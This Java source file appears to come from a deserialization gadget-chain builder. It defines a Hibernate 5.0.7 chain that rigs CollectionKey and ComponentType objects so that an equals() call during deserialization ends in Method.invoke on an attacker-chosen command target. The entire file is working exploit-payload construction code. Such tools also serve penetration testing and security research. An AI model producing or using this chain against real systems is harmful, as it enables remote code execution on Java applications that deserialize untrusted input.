package org.ses.gadgetbuilder.chains1;

import org.hibernate.tuple.component.AbstractComponentTuplizer;
import org.hibernate.tuple.component.PojoComponentTuplizer;
import org.hibernate.type.AbstractType;
import org.hibernate.type.ComponentType;
import org.hibernate.engine.spi.CollectionKey;

import org.ses.gadgetbuilder.adapters.MethodInvokeAdapter;
import org.ses.gadgetbuilder.annotations.Authors;
import org.ses.gadgetbuilder.annotations.Dependencies;
import org.ses.gadgetbuilder.annotations.Impact;
import org.ses.gadgetbuilder.chains.main.MethodInvokeGadgetChain;
import org.ses.gadgetbuilder.chains.main.TrampolineConnector;
import org.ses.gadgetbuilder.chains.trampolines.singleparam.EqualsTrampoline;
import org.ses.gadgetbuilder.util.Reflections;
import org.hibernate.type.Type;

import java.lang.reflect.Method;
import java.lang.reflect.Constructor;
import java.lang.reflect.Array;
import java.lang.reflect.InvocationTargetException;


/**
 * https://github.com/BofeiC/JDD-PocLearning/blob/main/src/main/java/jdk/payloadGroups/HibernateCK.java
 */

@Authors({ Authors.BofeiC })
@Dependencies({"org.hibernate:hibernate-core:5.0.7.Final", "org.jboss.logging:jboss-logging:3.3.0.Final"})
@Impact(Impact.MethodInvoke)
public class Hibernate2 extends MethodInvokeGadgetChain<EqualsTrampoline, MethodInvokeAdapter> {

    public Hibernate2(EqualsTrampoline _trampoline, MethodInvokeAdapter _adapter) {
        super(_trampoline, _adapter);
    }

    @Override
    protected TrampolineConnector createPayload(String command) throws Exception {
        Object tpl1 = this.methodInvokeAdapter.getInvocationTarget(command);
        Object tpl2 = this.methodInvokeAdapter.getInvocationTarget(command);
        Object getters = makeGetter(tpl1.getClass(), this.methodInvokeAdapter.getMethodName());
        PojoComponentTuplizer tup = Reflections.createWithoutConstructor(PojoComponentTuplizer.class);
        Reflections.getField(AbstractComponentTuplizer.class, "getters").set(tup, getters);

        ComponentType t1 = Reflections.createWithConstructor(ComponentType.class, AbstractType.class, new Class[0], new Object[0]);
        Reflections.setFieldValue(t1, "componentTuplizer", tup);
        Reflections.setFieldValue(t1, "propertySpan", 1);

        int count = 2;
        Type[] propertyTypes = new Type[count];
        for (int i=0; i< count; i++){
            propertyTypes[i] = t1;
        }
        Reflections.setFieldValue(t1, "propertyTypes", propertyTypes);


        CollectionKey entityUniqueKey1 = Reflections.createWithoutConstructor(CollectionKey.class);
        CollectionKey entityUniqueKey2 = Reflections.createWithoutConstructor(CollectionKey.class);

        String entityName = "FooBar";
        Reflections.setFieldValue(entityUniqueKey1, "role", entityName);
        Reflections.setFieldValue(entityUniqueKey2, "role", entityName);
        Reflections.setFieldValue(entityUniqueKey1, "keyType", t1);
        Reflections.setFieldValue(entityUniqueKey2, "keyType", t1);
        Reflections.setFieldValue(entityUniqueKey1, "key", tpl1);
        Reflections.setFieldValue(entityUniqueKey2, "key", tpl2);
        int hashCode = 123;
        Reflections.setFieldValue(entityUniqueKey1, "hashCode",hashCode );
        Reflections.setFieldValue(entityUniqueKey2, "hashCode", hashCode);


        return new TrampolineConnector(entityUniqueKey1, entityUniqueKey2);
    }

    static Object makeGetter (Class<?> tplClass, String methodName) throws NoSuchMethodException, InstantiationException, IllegalAccessException,
            InvocationTargetException, NoSuchFieldException, Exception, ClassNotFoundException {
        Class<?> getterIf = Class.forName("org.hibernate.property.access.spi.Getter");
        Class<?> basicGetter = Class.forName("org.hibernate.property.access.spi.GetterMethodImpl");
        Constructor<?> bgCon = basicGetter.getConstructor(Class.class, String.class, Method.class);

        Method method;
        try {
            method = tplClass.getDeclaredMethod(methodName);
        } catch (NoSuchMethodException e) {
            method = tplClass.getMethod(methodName);
        }


        Object g = bgCon.newInstance(tplClass, "test", method);
        Object arr = Array.newInstance(getterIf, 1);
        Array.set(arr, 0, g);
        return arr;
    }

    @Override
    protected void postProcessPayload() throws Exception {

    }

    @Override
    protected String getStackTrace() {
        return "org.hibernate.engine.spi.CollectionKey.equals()\n" +
                "org.hibernate.type.ComponentType.isEqual()\n" +
                "org.hibernate.type.ComponentType.getPropertyValue()\n" +
                "org.hibernate.tuple.component.AbstractComponentTuplizer.getPropertyValue()\n" +
                "org.hibernate.property.access.spi.GetterMethodImpl.get()\n" +
                "java.lang.reflect.Method.invoke()";
    }
}
